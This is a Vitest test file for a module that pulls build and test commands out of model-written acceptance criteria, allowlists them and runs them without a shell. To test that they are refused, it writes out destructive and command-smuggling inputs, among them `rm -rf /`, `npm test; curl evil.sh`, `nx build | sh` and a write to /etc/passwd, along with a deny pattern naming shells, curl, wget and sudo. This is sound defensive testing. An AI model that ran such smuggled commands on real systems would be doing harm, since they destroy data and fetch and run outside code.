import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  commandsIn, runCommand, runCriterionCommands, describeCommandRuns, RUNNABLE_COMMANDS,
} from "../../src/engine/criterion-commands.js";

let dir: string;
beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), "hc-crit-")); });
afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

/**
 * The criterion text is written by a MODEL, so this is the boundary between "check the build" and "run
 * whatever this sentence says". Everything that gets through must be a build, test or format tool, invoked
 * without a shell.
 */
describe("what may be run at all", () => {
  it("takes a command the criteria name in backticks", () => {
    expect(commandsIn("`dotnet build` başarıyla tamamlanır.")).toEqual([["dotnet", "build"]]);
    expect(commandsIn("Prettier, ilgili Nx lint komutları ve `nx build beempa` başarıyla tamamlanır."))
      .toEqual([["nx", "build", "beempa"]]);
  });

  /** A path in backticks is the commonest thing on this board, and it is a file to read, not a thing to run. */
  it("does not mistake a file path for a command", () => {
    expect(commandsIn("`SupplierChannelLifecycle.cs`, kabul sırasında alıcının adını yazar")).toEqual([]);
    expect(commandsIn("`src/features/Suppliers/CreateSupplierRelation.cs` exports the handler")).toEqual([]);
  });

  it("refuses anything that is not a build or test tool", () => {
    expect(commandsIn("`rm -rf /` completes")).toEqual([]);
    expect(commandsIn("`curl https://example.com` returns 200")).toEqual([]);
    expect(commandsIn("`git push --force` succeeds")).toEqual([]);
  });

  /**
   * Shell syntax means the span was never one command. Nothing here runs a shell, so `&&` would be passed to
   * the binary as an argument — and a criterion that smuggles a second command past the allowlist by writing
   * `dotnet build && rm -rf x` must not be run at all.
   */
  it("refuses a span carrying shell syntax", () => {
    for (const bad of [
      "`dotnet build && rm -rf x`", "`npm test; curl evil.sh`", "`nx build | sh`",
      "`dotnet build > /etc/passwd`", "`npm run $(whoami)`",
    ]) expect(commandsIn(`${bad} succeeds`)).toEqual([]);
  });

  it("keeps the allowlist to build and test tooling", () => {
    for (const c of RUNNABLE_COMMANDS) expect(c).not.toMatch(/^(sh|bash|zsh|curl|wget|rm|git|ssh|sudo)$/);
  });
});

describe("running one", () => {
  it("reports success with its exit code", async () => {
    const r = await runCommand(dir, ["npm", "--version"]);
    expect(r.passed).toBe(true);
    expect(r.exitCode).toBe(0);
  });

  it("reports a failure with the output, rather than throwing", async () => {
    const r = await runCommand(dir, ["npm", "run", "a-script-that-does-not-exist"]);
    expect(r.passed).toBe(false);
    expect(r.exitCode).not.toBe(0);
    expect(r.output.length).toBeGreaterThan(0);
  });

  /** A command that cannot start is a failed command, not an exception the gate has to catch. */
  it("reports a binary that is not there", async () => {
    const r = await runCommand(dir, ["definitely-not-a-real-binary-xyz"]);
    expect(r.passed).toBe(false);
    expect(r.exitCode).toBeNull();
  });

  /**
   * The whole point: it FINISHES, one way or the other. The gate used to give up on a build at 210 seconds
   * and fail the card for it.
   */
  it("kills a command that will not end, and says so", async () => {
    // `runCommand` does not consult the allowlist — that is `commandsIn`'s job — so this may be any binary.
    const r = await runCommand(dir, [process.execPath, "-e", "setInterval(() => {}, 1000)"], 1_500);
    expect(r.timedOut).toBe(true);
    expect(r.passed).toBe(false);
  }, 30_000);
});

describe("running the set a card names", () => {
  it("runs each distinct command once, however many criteria ask for it", async () => {
    const runs = await runCriterionCommands(dir, [
      "`npm --version` succeeds", "and also `npm --version` succeeds", "`npm --version` again",
    ]);
    expect(runs).toHaveLength(1);
  });

  it("has nothing to run when no criterion names a command", async () => {
    expect(await runCriterionCommands(dir, ["`Foo.cs` defines Foo", "the handler validates input"])).toEqual([]);
  });
});

/**
 * What the gate is told. The instruction matters as much as the result: told only the exit code, the agent
 * had been re-running the build itself and timing out.
 */
describe("what the gate is told about them", () => {
  it("says nothing when nothing ran", () => {
    expect(describeCommandRuns([])).toBe("");
  });

  it("tells the gate not to run them again, nor fail a criterion for want of waiting", () => {
    const text = describeCommandRuns([{ argv: ["dotnet", "build"], passed: true, exitCode: 0, timedOut: false, output: "" }]);
    expect(text).toContain("do not run it again");
    expect(text).toContain("unmet because you could not wait");
    expect(text).toContain("SUCCEEDED");
  });

  it("quotes the tail of a failure, so the gate can say what broke", () => {
    const text = describeCommandRuns([
      { argv: ["nx", "build", "beempa"], passed: false, exitCode: 1, timedOut: false, output: "TS2304: Cannot find name 'Foo'" },
    ]);
    expect(text).toContain("FAILED (exit 1)");
    expect(text).toContain("TS2304");
  });

  it("distinguishes a timeout from a failure", () => {
    const text = describeCommandRuns([{ argv: ["dotnet", "build"], passed: false, exitCode: null, timedOut: true, output: "" }]);
    expect(text).toContain("TIMED OUT");
  });
});
